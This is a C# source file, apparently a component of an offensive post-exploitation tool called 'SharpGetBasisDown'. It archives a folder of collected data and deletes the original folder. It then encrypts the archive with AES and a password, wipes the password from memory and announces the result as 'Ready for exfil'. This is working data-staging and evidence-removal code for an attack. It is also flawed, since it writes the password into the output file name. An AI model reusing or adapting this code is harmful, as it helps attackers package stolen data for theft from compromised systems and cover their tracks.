using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace SharpGetBasisDown
{
    class EncryptedZIPs
    {
        [DllImport("kernel32.dll", EntryPoint = "RtlZeroMemory")]
        public static extern bool RtlZeroMemory(IntPtr Destination, int Length);

        public static byte[] GenerateSalt()
        {
            byte[] data = new byte[32];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            for (int i = 0; i < 10; i++)
            {
                rng.GetBytes(data);
            }
            return data;
        }

        public static void Encrypter(string inputFile, string password)
        {
            FileStream fsCrypt = new FileStream(Path.GetFileNameWithoutExtension(inputFile) +"_"+ password + "_as.zip", FileMode.Create); //GetBasisDowns_password_as.zip
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            //Setup AES256 CFB
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            byte[] salt = GenerateSalt();
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000); //PBKDF2
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;

            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fs = new FileStream(inputFile, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
                fs.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("  [!] Error: " + e.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("  [X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("  [X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Encrypted(string passwd)
        {
            Thread.Sleep(15000);
            string FileName = "GetBasisDowns.zip";
            string archiveName = Environment.CurrentDirectory + @"\GetBasisDown";
            ZipFile.CreateFromDirectory(archiveName, FileName);
            DirectoryInfo di = new DirectoryInfo(archiveName);
            di.Delete(true);
            
            GCHandle handle = GCHandle.Alloc(passwd, GCHandleType.Pinned);
            try
            {
                Encrypter(FileName, passwd);
                
            }
            catch
            {
                Console.WriteLine("  [!] Something went wrong encrypting the archive.");
            }

            RtlZeroMemory(handle.AddrOfPinnedObject(), passwd.Length * 2);
            handle.Free();
            File.Delete(FileName);
            Console.WriteLine("  [>] Ready for exfil");
        }
    }
}